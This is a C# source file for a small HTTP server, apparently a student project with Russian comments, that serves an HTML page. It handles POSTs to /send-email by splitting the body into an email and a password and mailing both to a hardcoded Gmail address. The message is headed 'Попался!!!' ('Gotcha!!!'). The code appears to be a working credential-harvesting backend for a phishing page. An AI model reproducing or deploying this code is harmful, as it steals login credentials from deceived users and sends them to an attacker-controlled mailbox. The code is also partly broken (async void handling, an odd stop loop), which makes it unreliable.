using MyHtml.Configuration;
using MyHtml.services;
using MyHttp;
using MyHttp.Configuration;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using MimeKit;
using MimeKit.Text;
using MyHtml.handlers;
using StaticFilesHandler = MyHtml.handlers.StaticFilesHandler;

namespace HTTPServer          
{
    class Server : IEmailSenderService, IDisposable, ISendEmailHelper
    {
        HttpListener listener = new HttpListener(); // Объект, принимающий TCP-клиентов

        HttpListenerContext context;
        private HttpListenerRequest request;
        public HttpListenerResponse response;

        Appsetting config = Configurationcs.GetConfigurationcs();
        Stream output;

        public Server()
        {

            listener.Prefixes.Add($"{config.Address}:{config.Port}/");

            listener.Start();

            Console.WriteLine("Start выполнен");

            context = listener.GetContext();

            Handler staticFilesHandler = new StaticFilesHandler();
            Handler controllerHandler = new ControllerHandler();

            staticFilesHandler.Successor = controllerHandler;
            staticFilesHandler.HandleRequest(context);

            request = context.Request;
            string abslPath = request.Url.AbsolutePath;
            
            try
            {
                var requestUrl = context.Request.Url;

                response = context.Response;

                if (!FilesHandler.FolderIsExist(config.StaticFilePath))
                {
                    FilesHandler.CreateFolder(config.StaticFilePath);
                }

                var responseText = FilesHandler.GetHtml(config.StaticFilePath);


                using (StreamReader stream = new StreamReader(responseText))
                {
                    responseText = stream.ReadToEnd();
                }

                SendEmailHelper(abslPath);

                byte[] buffer = Encoding.UTF8.GetBytes(responseText);
                // получаем поток ответа и пишем в него ответ

                response.ContentLength64 = buffer.Length;

                WriteBuffer(buffer);

            }
            catch{
                Console.WriteLine(String.Format("Во время работы сервера произошла непредвиденная ошибка: "));
                Stop();
            }

        }

        private void WriteBuffer(byte[] buffer)
        {
            using (output = response.OutputStream)
            {
                output.WriteAsync(buffer, 0, buffer.Length);

                Console.WriteLine("Запрос обработан");

                Stop();

            }
        }
        private void Stop()
        {
            while (Console.ReadLine() != "stop")
            {
                listener?.Stop();
                output.FlushAsync();
            }
        }

        public async void SendEmailHelper(string abslPath)
        {
            if (request.HttpMethod.Equals("post", StringComparison.OrdinalIgnoreCase) && abslPath == "/send-email")
            {
                var stream = new StreamReader(request.InputStream);
                //var str = stream.ReadToEndAsync();
                var str = await stream.ReadToEndAsync();
                string[] arr = str.Split("&");
                SendEmailAsync(arr[0], arr[1]);
            }
        }

        public async Task SendEmailAsync(string email, string password)
        {
            EmailISenderService emailConfig = Configurationcs.GetEmailConfig();

            string mailSender = emailConfig.mailSender;
            string passwordSender = emailConfig.passwordSender;

            var fromEmail = "linzeroeleven@gmail.com";
            string fromName = "Tom";
            string toEmail = "linzeroeleven@gmail.com";
            string subject = "subject";
            string body = String.Format("<h1> Попался!!! </h1><p>email:{0}</p><p>password: {1}</p>", email, password);
            string smptServerHost = emailConfig.smptServerHost;
            ushort smtpServerPost = emailConfig.smtpServerPost;

            MailAddress from = new MailAddress(fromEmail, fromName);
            MailAddress to = new MailAddress(toEmail);

            MailMessage m = new MailMessage(from, to);
            m.Subject = subject;
            m.Body = body;

            SmtpClient smtp = new SmtpClient(smptServerHost, smtpServerPost);
            smtp.Credentials = new NetworkCredential(mailSender, passwordSender);
            smtp.EnableSsl = true;

            await smtp.SendMailAsync(m);
            Console.WriteLine("Письмо отправлено");
        }
        public void Dispose()
        {
            Stop();
        }
    }
}
